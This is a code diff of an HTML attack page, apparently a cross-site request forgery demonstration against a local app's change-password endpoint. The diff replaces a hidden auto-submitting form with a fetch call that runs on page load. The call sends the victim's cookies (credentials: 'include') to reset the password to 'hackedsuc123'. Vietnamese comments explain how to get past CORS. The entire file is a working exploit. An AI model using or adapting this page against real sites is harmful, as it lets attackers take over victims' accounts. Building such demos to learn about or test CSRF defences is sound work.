@@ -6,21 +6,24 @@
     src="https://picsum.photos/400/300"
 >
 
-<form
-    action="https://localhost:5001/api/change-password"
-    method="POST"
-    id="attackForm">
-
-    <input
-        type="hidden"
-        name="password"
-        value="hacked123">
-</form>
-
 <script>
-window.onload = () => {
-    document.getElementById('attackForm').submit();
-};
-</script>
+        window.onload = async () => {
+            // Sử dụng fetch để ép trình duyệt gửi kèm Cookie (credentials: 'include')
+            try {
+                const response = await fetch('http://localhost:5001/api/change-password', {
+                    method: 'POST',
+                    headers: {
+                        // Lưu ý: Không dùng Custom Header ở đây vì sẽ bị CORS chặn trước khi kịp gửi cookie
+                        'Content-Type': 'application/json' 
+                    },
+                    body: JSON.stringify({ password: 'hackedsuc123' }),
+                    credentials: 'include' // BẮT BUỘC: Cho phép gửi kèm cookie cross-origin
+                });
+                console.log("Attack triggered!");
+            } catch (err) {
+                console.error("Lỗi gửi request:", err);
+            }
+        };
+    </script>
 
 </body>
